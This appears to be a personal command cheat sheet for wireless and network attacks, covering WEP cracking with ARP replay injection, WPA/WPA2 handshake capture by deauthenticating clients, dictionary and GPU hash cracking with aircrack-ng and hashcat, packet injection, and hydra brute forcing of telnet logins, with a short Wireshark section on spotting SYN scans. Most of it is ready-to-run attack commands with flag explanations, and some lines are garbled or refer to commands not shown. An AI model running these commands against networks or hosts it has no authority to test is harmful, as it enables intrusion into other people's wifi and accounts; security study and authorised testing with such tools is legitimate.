# INTERNAL NETWORK SCANNING
###########################
# Before opening OpenVAS for the first time you must use the "openvas initial setup" program. CLI name is `openvas-setup`
	# It will display a critical password THAT YOU MUST NOT LOOSE
		# Default username is "admin"
openvas-feed-update	# This will update ovas - should be done each use (even if slow)
# https://127.0.01:9392 & https://localhost:9392	These are the web portals to access ovas. They MUST have https:// in front. Web browser should throw warning...just add exception and continue forward.
# Don't use any 'easy setup wizard' type helpers to make your scans

# WEP ROUTER CRACKING / NETWORK SNIFFING
########################################
iwconfig	# Find your wifi adapter (we'll use wlan0 for example)
sudo airmon-ng start wlan0 # Where 'wlan0' would be any interface that can sniff
	# You will see the interface you've chosen is now suffixed by "mon"
sudo airodump-ng wlan0mon
	# Find the BSSID and CH (channel) for the targeted network. For example I'll use 00:01:02:03:04:05 and channel 11
	# The "PWR" column is negative. Numbers closer to 0 (positive) are stronger
sudo airodump-ng -c 11 --bssid 00:01:02:03:04:05 -w dump wlan0mon   # This begins the sniffing and saves all caps in current directory and prefixed with "dump"
	# -c 11	# Declare what channel to use
	# -w dump	# Prefix for the output files
	# wlan0mon	# Monitoring interface to use
	# White hats can fake authentication packets to give false positives to hackers:

			# -1	# Signal a fake authentication
			# 0	# Reassociation timing (in seconds)
			# -a 00:01:02:03:04:05	# This is the router being hacked
			# -h 09:08:07:06:05:04	# This is any MAC address
			# --ignore-negative-one	# Ignore the -1 channel of wlan0mon
# The next 2 codes are more bruteforce-ish, can be swapped out for the "Replay Attack" section
sudo aircrack-ng -b 00:01:02:03:04:05 dump-01.cap   # Attempt cracking wifi using the named .cap file
sudo aircrack-ng -b 00:01:02:03:04:05 dump-01.cap -w wordlist.txt	# Once you have enough IVs in your .cap file this will compare the wifi keys against a given wordlist 

# REPLAY ATTACK (aka ARP Injection):
# Create traffic that appears to come from a trusted MAC address and route it to targed router (aka Replay Attack):
aireplay-ng -3 -b 00:01:02:03:04:05 -h 09:08:07:06:05:04 wlan0mon --ignore-negative-one
# Open a new terminal an run this to simulate legit traffic (must be run at same time)

	# -2	# Use interactive Replay Attack

	# -b 00:01:02:03:04:05	# The targeted router
	# -h A1:B2:C3:D4:E5:F6	# Your (the hacker)'s MAC address
# Wait for the "#Data," field to be >5000 (if WEP) in the airodump terminal
# After >5000 Data close all running terminals and run:
aircrack-ng -a 1 -b 00:01:02:03:04:05 -n 64 dump-01.cap
	# -a 1	# Force static WEP
	# dump-01.cap	# This is the file created during airodump, should be in directory were you ran the command in


# WpA/WPA2 ATTACKS (wifi router)
##################
iwconfig	# Find your wifi adapter (we'll use wlan0 for example)
service network-manager stop	# NM must be stopped first
sudo airmon-ng start wlan0 # Where 'wlan0' would be any interface that can sniff
sudo airodump-ng wlan0mon	# Copy the BSSID of target. Might not be necessary
sudo airodump-ng --bssid 00:01:02:03:04:05 -c 6 --showack -w wpa_log wlan0mon
	# --bssid is of targeted router
	# -c 6	# Channel router is on
	# --showack	# Ensure client computer acknowledges request from wifi point
	# -w wpa_log	# Write output to file with provided prefix
	# wlan0mon	# Your adapter in monitor mode
# Minimize (don't close) that terminal and open another to launch deauthentication attack. It kicks someone off the network so they have to re-enter (which is when you grab their key)
sudo aireplay-ng -0 20 -a 00:01:02:03:04:05 -c 09:08:07:06:05:04 wlan0mon
	# -0	# Indicates deauthentication attack
	# 20	# Send 20 deauthentication packets
	# -a	# Target router/access point bssid
	# -c	# Client's MAC address (found in the other terminal from the last command). Pick one to kick off the network
		# This isn't in the BSSID column, it's the "STATION" column
# If the deauth worked the top of the airodump terminal will briefly say "WPA handsake " followed by the target router's MAC
sudo aircrack-ng wpa_log-01.cap -w /path/to/wordlist.txt
	# wpa_log-01.cap	# The output file named in previous step but suffixed with the specific dump number
	# -w /path/to/wordlist.txt	# The dictionary to begin brute forcing with
# General cleanup/setting things back to normal
sudo airmon-ng stop wlan0mon
sudo service network-manager start


# GPU BASED HASH/KEY CRACKING
#############################
# Pairs well with WEP/WPA/WPA2 hacking
lspci | grep -i "VGA"	# Check your GPU type
sudo apt-get install p7zip-full -y	# Install 7zip to extract GPU crackers
wpaclean clean.cap /path/to/wpa_log-01.cap	# Clean the airodump cap for use with AMD Hashcat
sudo aircrack-ng clean.cap -J outfile	# Generate a Hashcat compatible file
	# clean.cap	# Created during wpaclean step
	# outfile	# The file to be created during generation (will be suffixed with ".hccap"
hashcat -m 2500 outfile.hccap /path/to/wordlist.txt --force
	# -m 2500	# Signifies WPA attacks
	# outfile.hccap	# The file generated in previous step
	# Password should be found in the output of the command


# PACKET INJECTION
##################
sudo aireplay-ng -9 wlan0	# Test if your device supports packet injection. "-9" is the test flag and is aka "--test" and "wlan0" is your wifi card.
sudo wash -i wlan1mon	# Check if the target is using WPC - it not then it will not appear in list
sudo aireplay-ng --fakeaut 0 -e "My Wifi name" -a 00:01:02:03:04:05 wlan1mon	# Begin injecting fake packets to router. If your device (wlan1mon) is not on the same channel as the router use `sudo iwconfig wlan1mon channel 1` where "1" would be the number of your router's channel.



# SYN SCAN DETECTION
####################

# A hacker will run:
	ifconfig	# Identify the "inet addr:". For example we'll use 10.0.0.222
	nmap 10.0.0.101 -v	# Scan the IP host at the .101 address (it should be there)
# The whitehat then reviews the Wireshark logs
	# Choose "Statistics > Conversations" from menu bar
	# On the "IPv4" tab you'll find the conversation between the hacker on .222 and the host on .101 with a large number of packets in the "Packets" column
	# The "TCP:" tab will show numerous packets being sent between .222 and .101
	# You can select an entry and click "Follow Streams" button. Disregard popup window and minimize the "Conversations" window you were in, returning to main Wireshark window
	# This will show who sent what and further details
		# If there are conversations after the "RST" packet is sent it may be suspicious
# If numerous SYN packets are comming from the same MAC address / IP in a very short timeframe (miliseconds-ish) you're probably getting DoS/DDoS attacked
	# But not always...


# BRUTE FORCE ATTACKING (telnet targets)
#######################
hydra -v -V -l username -P /path/to/wordlist.txt -t 8 10.0.0.101 telnet
	# "-l username" is the login command folowed by target's username
	# "-P ..wordlist.txt" is path to the passwords to attempt logging in with
	# "-t 8" specify the number of max parallel connections (bigger = faster)
	# "10.0.0.101" fake victim for example
	# "telnet" the protocol to brute force on
	# The output will list if the password  was found
telnet	# This will open a telnet sub-terminal
	10.0.0.101
	# Enter login details from above step
# The attempts to brute force will appear in a Wireshark if admins were monitoring during the hack
